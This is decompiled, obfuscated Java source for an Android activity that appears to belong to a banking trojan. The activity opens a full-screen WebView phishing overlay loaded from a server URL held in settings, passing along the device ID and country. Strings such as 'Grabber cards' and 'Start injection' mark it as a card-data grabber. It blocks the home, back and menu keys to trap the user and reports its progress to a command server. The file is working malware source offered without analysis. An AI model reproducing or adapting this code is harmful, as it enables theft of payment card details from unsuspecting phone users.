package wocwvy.czyxoxmbauu.slsa.ncec;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.C0039c;

public class pltrfi extends Activity {

    /* renamed from: a */
    C0039c f467a = new C0039c();

    /* renamed from: b */
    C0034b f468b = new C0034b();

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.pltrfi$a */
    private class C0059a extends WebChromeClient {
        private C0059a() {
        }

        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.pltrfi$b */
    private class C0060b extends WebViewClient {
        private C0060b() {
        }

        public void onPageFinished(WebView webView, String str) {
            pltrfi.this.f468b.mo213a("Start Activity Inject", str);
            if (str.contains("a10.php") && !str.contains("STOP")) {
                pltrfi.this.f468b.mo233d(pltrfi.this, "save_inj", "");
                pltrfi.this.f468b.mo233d(pltrfi.this, "lock_inj", "");
                pltrfi.this.f468b.mo233d(pltrfi.this, "timeStartGrabber", "");
                pltrfi.this.f468b.mo233d(pltrfi.this, "name", "false");
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
            }
            if (str.contains("STOP")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                pltrfi.this.finish();
            }
            if (str.contains("exitdagjhadfjedgjsfhexitlgdgsfhafg")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                pltrfi.this.finish();
            }
            if (str.contains("|Grabber card step 3|")) {
                pltrfi.this.f468b.mo233d(pltrfi.this, "save_inj", "");
                pltrfi.this.f468b.mo233d(pltrfi.this, "lock_inj", "");
                pltrfi.this.f468b.mo233d(pltrfi.this, "timeStartGrabber", "");
                pltrfi.this.f468b.mo233d(pltrfi.this, "name", "false");
            }
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    /* access modifiers changed from: protected */
    @SuppressLint({"SetJavaScriptEnabled"})
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    public void onDestroy() {
        super.onDestroy();
        this.f468b.mo233d(this, "name", "false");
    }

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    /* access modifiers changed from: protected */
    public void onStart() {
        super.onStart();
        this.f468b.mo233d(this, "name", "true");
        String stringExtra = getIntent().getStringExtra("str");
        if (!stringExtra.equals("") || !stringExtra.equals(null)) {
            this.f467a.getClass();
            String str = "";
            try {
                str = this.f468b.mo234e(this, "urlInj");
            } catch (Exception unused) {
            }
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setScrollBarStyle(0);
            webView.setWebViewClient(new C0060b());
            webView.setWebChromeClient(new C0059a());
            String country = Resources.getSystem().getConfiguration().locale.getCountry();
            StringBuilder sb = new StringBuilder();
            sb.append(str);
            sb.append("/fafa.php?f=");
            sb.append(stringExtra);
            sb.append("&p=");
            sb.append(this.f468b.mo247q(this));
            sb.append("|");
            sb.append(country.toLowerCase());
            webView.loadUrl(sb.toString());
            setContentView(webView);
            if (stringExtra.equals("grab3")) {
                stringExtra = "Info + Grabber cards mini";
            }
            if (stringExtra.equals("grab1")) {
                stringExtra = "Info + Grabber cards";
            }
            if (stringExtra.equals("grab4")) {
                stringExtra = "Grabber cards mini";
            }
            if (stringExtra.equals("grab2")) {
                stringExtra = "Grabber cards";
            }
            StringBuilder sb2 = new StringBuilder();
            sb2.append("p=");
            C0034b bVar = this.f468b;
            StringBuilder sb3 = new StringBuilder();
            sb3.append(this.f468b.mo247q(this));
            sb3.append("|Start injection ");
            sb3.append(stringExtra);
            sb3.append("|");
            sb2.append(bVar.mo225c(sb3.toString()));
            this.f468b.mo218b(this, "4", sb2.toString());
        }
    }

    /* access modifiers changed from: protected */
    public void onStop() {
        super.onStop();
        this.f468b.mo233d(this, "name", "false");
    }
}
